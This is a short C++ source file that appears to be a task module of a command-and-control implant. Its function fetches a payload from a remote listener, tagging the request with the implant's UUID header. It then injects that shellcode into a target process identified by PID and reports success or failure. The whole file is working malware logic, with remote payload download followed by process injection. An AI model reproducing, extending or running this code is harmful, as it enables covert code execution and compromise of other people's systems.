#include "core/task.hpp"

namespace Task
{
     std::wstring Shellcode(
        State::PSTATE pState,
        const std::wstring& wPid,
        const std::wstring& wSrc,
        const std::wstring& wTechnique
    ) {        
        // Download shellcode
        std::wstring wHeaders = L"X-UUID: " + pState->wUUID + L"\r\n";
        std::vector<BYTE> bytes = System::Http::DataDownload(
            pState->pProcs,
            pState->pCrypt,
            pState->hConnect,
            pState->lpListenerHost,
            pState->nListenerPort,
            pState->lpReqPathDownload,
            wHeaders.c_str(),
            wSrc
        );
        if (bytes.size() == 0)
        {
            return L"Error: Failed to get DLL.";
        }

        // Inject shellcode
        if (wcscmp(wTechnique.c_str(), L"shellcode-injection") == 0)
        {
            DWORD dwPid = Utils::Convert::WstringToDWORD(wPid, 10);

            if (!Technique::Injection::ShellcodeInjection(pState->pProcs, dwPid, bytes))
            {
                return L"Error: Failed to inject shellcode.";
            }
        }

        return L"Success: Shellcode injected successfully.";
     }
}